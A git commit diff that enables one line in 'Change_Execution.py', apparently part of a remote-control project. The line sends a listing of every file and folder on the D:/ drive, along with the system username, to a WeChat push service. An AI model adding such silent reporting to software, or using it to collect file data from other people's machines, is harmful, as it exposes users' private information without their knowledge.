2da36c3adbccb81e1cbb9f63eff0229b20e0029c
GCLgaici <3471093372@qq.com>
2024-10-26 22:31:25 +0800

    yc

--- Control_files/Change_Execution.py
+++ Control_files/Change_Execution.py
@@ -9,4 +9,4 @@ for i in os.listdir("D:/"):
     wjb += '|文件：' + i
 
 print(wjb)
-# self.main.wechat_push.Alleged_information(f'{self.main.sys_username}|'+wjb)
+self.main.wechat_push.Alleged_information(f'{self.main.sys_username}|'+wjb)
